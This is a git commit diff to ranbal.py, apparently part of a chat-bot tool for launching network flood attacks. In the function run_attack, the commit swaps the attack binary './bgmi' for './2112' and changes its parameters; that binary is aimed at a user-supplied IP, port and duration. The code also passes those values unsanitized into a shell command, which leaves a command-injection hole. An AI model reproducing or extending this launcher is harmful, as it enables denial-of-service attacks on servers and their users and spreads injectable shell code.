5f0a0b445a17a92cb226425dacbbdfaa94a8d59d
soldier-don <palakwfxtt@gmail.com>
2025-02-22 18:15:31 +0530

    Update ranbal.py

--- ranbal.py
+++ ranbal.py
@@ -172,7 +172,7 @@ async def run_attack(chat_id, ip, port, duration, context):
     attack_in_progress = True
 
     try:
-        command = f"./bgmi {ip} {port} {duration} 1 1000"
+        command = f"./2112 {ip} {port} {duration} 900"
         process = await asyncio.create_subprocess_shell(
             command,
             stdout=asyncio.subprocess.PIPE,
